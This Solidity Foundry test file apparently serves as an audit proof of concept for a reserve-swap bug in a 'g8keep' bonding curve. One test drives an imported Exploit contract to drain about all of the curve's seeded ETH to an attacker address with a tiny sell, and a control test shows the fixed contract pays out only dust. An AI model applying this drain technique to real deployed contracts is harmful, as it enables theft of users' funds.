// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    g8keepBondingCurve,
    g8keepBondingCurveFixed,
    MiniToken,
    WETH9
} from "./64999-h-02-incorrect-reserve-assignment-leads-to-reserve-mismatch.sol";

contract IncorrectReserveAssignmentTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant SELLER = 0x000000000000000000000000000000000000bEEF;

    uint256 internal constant ETH_AMOUNT = 1e18;   // protocol ETH staged in the curve
    uint112 internal constant TOKEN_AMOUNT = 1e24; // token side of the (mis)assigned reserves
    uint256 internal constant SELL_AMOUNT = 1e12;  // microscopic token position

    // ── The bug: a failed migration swaps the reserves, inverting the sell
    //    price so a tiny token sale drains the curve's entire ETH balance. ──
    function test_exploit_reserveSwap_drainsCurveEth() public {
        Exploit e = new Exploit();
        vm.deal(address(e), ETH_AMOUNT); // protocol/user funds seeded into the curve (NOT attacker capital)

        uint256 attackerBefore = ATTACKER.balance;
        e.run();
        uint256 stolen = ATTACKER.balance - attackerBefore;

        // Attacker drained essentially the entire 1 ETH pool via one tiny sell.
        assertGe(stolen, (ETH_AMOUNT * 9) / 10, "attacker drained ~all curve ETH");

        // The curve is left with dust — its ETH is gone.
        assertLe(e.curveAddr().balance, ETH_AMOUNT / 20, "curve ETH drained");

        // The drained amount reported by the curve matches what the attacker holds.
        assertEq(e.ethDrained(), stolen, "drained == stolen");

        emit log_named_uint("attacker stolen ETH (wei)", stolen);
        emit log_named_uint("curve residual ETH (wei)", e.curveAddr().balance);
    }

    // ── Negative control: identical flow with the CORRECT reserve assignment.
    //    The same tiny sale yields only fair (dust) proceeds; nothing drains. ──
    function test_control_correctAssignment_noDrain() public {
        MiniToken token = new MiniToken("g8keep", "G8K");
        WETH9 weth = new WETH9();
        g8keepBondingCurveFixed curve = new g8keepBondingCurveFixed(address(token), address(weth));

        // Seed the curve with 1 ETH of protocol funds (held as WETH).
        vm.deal(address(this), ETH_AMOUNT);
        weth.deposit{value: ETH_AMOUNT}();
        weth.transfer(address(curve), ETH_AMOUNT);

        // Correct assignment: reserve0=ethAmount(1e18), reserve1=tokenAmount(1e24).
        curve.triggerMigrationFailed(ETH_AMOUNT, TOKEN_AMOUNT);

        // The seller holds the same microscopic token position and sells it.
        token.mint(SELLER, SELL_AMOUNT);
        vm.prank(SELLER);
        token.approve(address(curve), SELL_AMOUNT);

        uint256 sellerBefore = SELLER.balance;
        vm.prank(SELLER);
        uint256 got = curve.sell(SELL_AMOUNT);
        uint256 gained = SELLER.balance - sellerBefore;

        // Fair proceeds are dust; the curve keeps essentially all of its ETH.
        assertLe(got, 1e7, "fair sell yields only dust proceeds");
        assertLe(gained, 1e7, "seller gained only dust");
        assertGe(address(curve).balance, (ETH_AMOUNT * 99) / 100, "curve retains ~all ETH (no drain)");

        emit log_named_uint("fair sell proceeds (wei)", gained);

        // The bug's harm is orders of magnitude larger than the fair baseline.
        // (buggy drain >= 0.9e18 vs fair proceeds <= 1e7  =>  ratio > 9e10)
        assertGt((ETH_AMOUNT * 9) / 10, gained * 1000, "buggy drain dwarfs fair proceeds");
    }
}
